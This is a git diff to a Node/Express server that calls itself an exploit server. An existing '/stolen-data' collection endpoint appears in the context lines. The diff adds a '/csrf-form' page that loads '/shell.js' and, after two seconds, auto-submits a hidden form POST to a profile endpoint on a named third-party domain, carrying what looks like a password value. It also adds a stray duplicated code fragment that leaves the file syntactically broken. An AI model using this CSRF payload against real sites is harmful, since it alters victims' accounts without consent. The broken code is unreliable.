@@ -189,6 +189,30 @@ app.post("/stolen-data", (req, res) => {
   res.send("✅ Đã thu thập xong dữ liệu!");
 });
 
+app.get("/csrf-form", (req, res) => {
+  const html = `
+    <html>
+      <body>
+        <h1>Đang tải...</h1>
+        <script src="/shell.js"></script>
+        <form id="csrfForm" action="https://crm.aulac.edu.vn/profile" method="POST" enctype="text/plain">
+          <input type="hidden" name="" value='["Long@1234"]'>
+        </form>
+        <script>
+          setTimeout(() => document.getElementById("csrfForm").submit(), 2000);
+        </script>
+      </body>
+    </html>
+  `;
+  res.setHeader("Content-Type", "text/html");
+  res.send(html);
+});
+
+
+  res.setHeader("Content-Type", "text/html");
+  res.send(html);
+});
+
 // Khởi chạy server
 app.listen(PORT, () => {
   console.log(`⚡ Server exploit đang chạy tại: http://localhost:${PORT}`);
